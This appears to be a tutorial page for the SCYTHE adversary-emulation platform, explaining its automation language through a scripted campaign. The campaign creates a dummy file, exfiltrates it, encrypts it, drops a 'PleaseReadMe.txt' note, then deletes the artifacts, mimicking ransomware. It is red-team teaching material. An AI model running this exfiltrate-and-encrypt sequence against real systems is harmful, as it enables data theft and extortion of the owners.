# Example Script 2

This Compound Action is the Example Script 2 from Appendix B of the SCYTHE User Guide. It demonstrates use of advanced automation features, including using the output of prior commands to inform logic of future commands. Variables and pattern matching are also demonstrated.

Please refer to section 2.2 - Automate Campaign Actions in the User Guide for documentation on what functions are support on strings in SCYTHE's automation language.

## Steps

1. `encryption_key = h3ll0w0rld`
    * Set the variable `encryption_key` to equal "h3ll0w0rld". This variable is used later as the passphrase for encrypting a file with the `crypt` module. 
    * This is an example of how to set a variable within SCYTHE's automation language. To set variables, click "Show more..." beneath "Custom Action". You will see an `Assign` action. Click this and a menu will appear that allows you to set a variable name and value. The value can then be reused by referring to it via the Step # where the value was assigned.
    * NOTE: Variables are not currently accessed by their name, but by referencing the output of the step in which they were declared.
2. `loader --load crypt`
    * Load the `crypt` module. This module can be used to encrypt files using the "Microsoft Base Cryptographic Provider" API to perform symmetric AES 256-bit encryption.
3. `loader --load downloader`
    * Load the `downloader` module, which is will be used to place a file from the VFS onto the target's filesystem.
4. `loader --load file`
    * Load the `file` module, which can be used to create random files with random data.
5. `loader --load search`
    * Load the `search` module, which is used to search for files in a directory structure.
6. `loader --load uploader`
    * Load the `uploader` module, which is used to exfiltrate files from the target system.
7. `delay --time 10`
    * Add a manual delay of 10 seconds.
8. `file --create --path "%USERPROFILE%\Documents\ssn_private.xls" --size 10MB --random`
    * Create a file with 10MB of random data in the user's Documents folder. Note that we are able to use an environment variable `USERPROFILE` in the file path.
9. `search --directory "%USERPROFILE%" --filename "ssn_private.xls" --recurse`
    * Search the User's profile recursively for a file (the one we created in step 8).
10. `target_path = $(9).response["filepaths"][0]`
    * Assign a value to a variable.
    * This is the first step that makes use of SCYTHE's automation language. Let's break it down:
        * `$(9)` - This references Step 9.
        * `.response` - You may reference either a step's request (input) or response (output).
        * `response["filepaths"]` The `search` module returns a property in it's response that is an array of strings called `filepaths`. You may view the schema of the module by hovering over the `i` button next to the module name in the "Custom Action" dialog. Additionally, while you are typing the command of a Custom Action you may press the `CTRL + Space` keyboard combination to see tooltips of the different values or functions of a variable that you may use.
        * `response["filepaths"][0]` The last part of this is an index into the `filepaths` list. Since `filepaths` is, on the backend, a Python list containing strings, its elements may be accessed via Python's syntax. In this case we are accessing it's 0th element.
    * Ultimately, what this Step is doing is getting the first file path found by the `search` command in step 9. This is also the file that we created in step 8.
11. `uploader --remotepath $(10).response`
    * Use the `uploader` module to exfiltrate the file that we found.
    * We use `$(10).response` to obtain the string that we assigned to `target_path` in step 10. Because the variable name is irrelevant, we get the results of that Assign action by referencing the response (the output) of the step in which it was declared.
11. `crypt --target $(10).response --encrypt --password $(1).response`
    * Encrypt the file on the target's machine with the password that we decided upon in step 1.
    * Here we references variables in two steps. The file path that we obtained in step 10, and the password that we decided upon in step 1.
12. `downloader --src "VFS:/shared/threats/ExampleScript2/PleaseReadMe.txt" --dest $(10).response.extract(".*\\\\")[0].suffix("PleaseReadMe.txt")`
    * This is the most complex command in the example. It makes use of special SCYTHE Automation Language functions that are described in the table in Section 2.2 of the SCYTHE User Guide.
    * Here we place a file from the VFS into the same directory in which we found the `.xls` file that we created earlier. Let's unpack each part:
        * `downloader --src "VFS:/shared/threats/ExampleScript2/PleaseReadMe.txt"` - Use the `downloader` module to place a file from the VFS onto the target's filesystem. This assumes that there is a file in the VFS at the path specified.
        * `$(10).response` - Get the file path from step 10.
        * `$(10).response.extract(".*\\\\")` - Extract a substring from that filepath using a the regular expression (regex) pattern "`.*\\\\`". This uses Python's `re` library. Please note that the backslashes (`\`) are escaped.
        * `extract(".*\\\\")[0]` - The `extract` function produces an array (a Python `list`) of strings. In this case there is only one element in the array (the 0th element). So we access it using Python's indexing syntax. The result will be the path of the directory in which the `.xls` file resides.
        * `.suffix("PleaseReadMe.txt")` - The `suffix` function in SCYTHE's automation language appends a string onto another string. In this case, we are appending "PleaseReadMe.txt" onto the path of the directory.
        * After all portions are evaluated, the result is the directory path + "PleaseReadMe.txt" as the final path of where the text file should be placed. The file will be copied from the VFS and written to that path.
13. `STEP = CLEANUP`
    * Assignment steps can also be used to add comments in your SCYTHE Campaign. In this case, we use assignment to state that the following steps are for cleanup.
14. `loader --load run`
    * Loads the `run` module, which creates new processes.
15. `run cmd /c del $(10).response`
    * Uses the Windows command shell to run a one-liner that deletes the `.xls` file that we created earlier.
16. `run cmd /c del $(10).response.suffix(".$xb")`
    * Deletes the encrypted version of the `.xls` file that we created earlier.
17. `run cmd /c del $(10).response.extract(".*\\\\")[0].suffix("PleaseReadMe.txt")`
    * Deletes the text file that we place don the target filesystem earlier.
18. `controller --shutdown`
    * This is a special command that shuts down the SCYTHE client. This will cause the client to go inactive.